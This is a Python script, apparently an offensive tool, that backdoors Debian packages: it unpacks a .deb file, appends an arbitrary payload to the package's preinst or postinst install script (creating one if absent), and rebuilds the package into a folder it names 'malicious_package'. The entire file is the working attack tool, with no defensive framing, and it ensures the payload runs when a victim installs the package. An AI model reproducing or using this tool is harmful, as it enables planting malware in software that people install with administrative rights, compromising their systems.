#!/usr/bin/python3

import subprocess
import os
from colorama import Fore, Style
import shutil


def rebuild_deb(filename: str, payload: str):
    rebuild_deb.filename = filename
    printout('[+] Extracting Package....', 'blue')
    extract()
    printout('[+] Looking for Already Present Scripts....', 'blue')
    script = check_script()
    printout('[+] Embedding Payload....', 'blue')
    embed(script, payload)
    printout('[+] Building Package....', 'blue')
    build()
    printout('[+] Cleaning Up....', 'yellow')
    clean()
    printout('[+] Done', 'green')
    printout('[+] Package created inside malicious_package directory', 'red')

def printout(string: str, color: str, bold=False):
    colors = {'red': Fore.RED, 'blue': Fore.BLUE,
              'green': Fore.GREEN, 'yellow': Fore.YELLOW}
    if bold:
        print(Style.BRIGHT+colors[color]+string+Style.RESET_ALL)
    else:
        print(colors[color]+string+Style.RESET_ALL)


def check_script():
    debian_path = f'{extract.extracted_package}/DEBIAN'
    preinst_path = f'{debian_path}/preinst'
    postinst_path = f'{debian_path}/postinst'
    if os.path.exists(preinst_path) or os.path.exists(postinst_path):
        if os.path.exists(preinst_path):
            return preinst_path
        else:
            return postinst_path
    else:
        file = open(preinst_path, 'w+')
        file.close()
        os.chmod(preinst_path, 0o755)
        return preinst_path


def extract():
    extract.file = os.path.basename(rebuild_deb.filename)
    extract.name = os.path.splitext(extract.file)[0]
    extract.extracted_package = f'/tmp/{extract.name}'
    try:
        io = subprocess.Popen(
            ["dpkg-deb", "-R", rebuild_deb.filename, extract.extracted_package], stdout=subprocess.PIPE)
        io.communicate()
    except FileNotFoundError:
        raise 'dpkg-deb command not found'


def embed(script: str, payload: str):
    file = open(script, 'a')
    file.write(payload)
    file.close()


def build():
    cwd = os.getcwd()
    try:
        naughty_debian = os.mkdir(f'{cwd}/malicious_package')
    except FileExistsError:
        pass
    rebuilded = f'{cwd}/malicious_package/{extract.file}'
    try:
        io = subprocess.Popen(
            ["dpkg-deb", "-b", extract.extracted_package, rebuilded], stdout=subprocess.PIPE)
        io.communicate()
    except FileNotFoundError:
        raise 'dpkg-deb command not found'


def clean():
    shutil.rmtree(extract.extracted_package)
